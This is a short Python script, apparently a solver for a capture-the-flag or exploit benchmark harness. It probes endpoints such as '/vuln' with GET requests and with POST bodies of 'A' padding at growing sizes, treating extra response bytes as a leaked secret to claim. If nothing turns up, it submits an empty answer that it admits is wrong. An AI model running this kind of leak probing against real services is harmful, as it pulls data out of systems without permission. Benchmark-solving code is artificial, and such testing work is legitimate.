import sys, json, base64, binascii

def send_http(method, path, body_hex=None, headers=None):
    req = {"http": {"method": method, "path": path}}
    if body_hex is not None:
        req["http"]["body_hex"] = body_hex
    if headers:
        req["http"]["headers"] = headers
    print(json.dumps(req), flush=True)
    line = sys.stdin.readline()
    if not line:
        sys.exit(0)
    return json.loads(line)

def decode_body(resp):
    b64 = resp.get('body_b64', '')
    if not b64:
        return b''
    try:
        return base64.b64decode(b64)
    except Exception:
        return b''

def is_hex_ascii(data):
    try:
        txt = data.decode('utf-8')
    except Exception:
        return False
    txt = txt.strip()
    if len(txt) % 2 != 0 or len(txt) == 0:
        return False
    for ch in txt:
        if ch not in '0123456789abcdefABCDEF':
            return False
    return True

def main():
    # provision argument ignored
    paths = ['/parse', '/record', '/vuln', '/']
    # try simple GET first to see if secret is returned without payload
    for path in paths:
        resp = send_http('GET', path)
        body = decode_body(resp)
        if body and is_hex_ascii(body):
            claim = {"secret_hex": body.decode().strip().lower()}
            print(f"CLAIM:{json.dumps(claim)}")
            return
    # now try POST with varying payload sizes
    for path in paths:
        for size in [64, 128, 256, 512, 1024, 2048, 4096, 8192]:
            payload = b'A' * size
            resp = send_http('POST', path, body_hex=payload.hex())
            body = decode_body(resp)
            if not body:
                continue
            # if response longer than request, treat extra as secret
            if len(body) > size:
                secret = body[size:]
                claim = {"secret_hex": binascii.hexlify(secret).decode()}
                print(f"CLAIM:{json.dumps(claim)}")
                return
            # if body looks like hex string, maybe it's the secret directly
            if is_hex_ascii(body):
                claim = {"secret_hex": body.decode().strip().lower()}
                print(f"CLAIM:{json.dumps(claim)}")
                return
    # fallback empty claim (will be wrong)
    print('CLAIM:' + json.dumps({"secret_hex": ""}))

if __name__ == '__main__':
    main()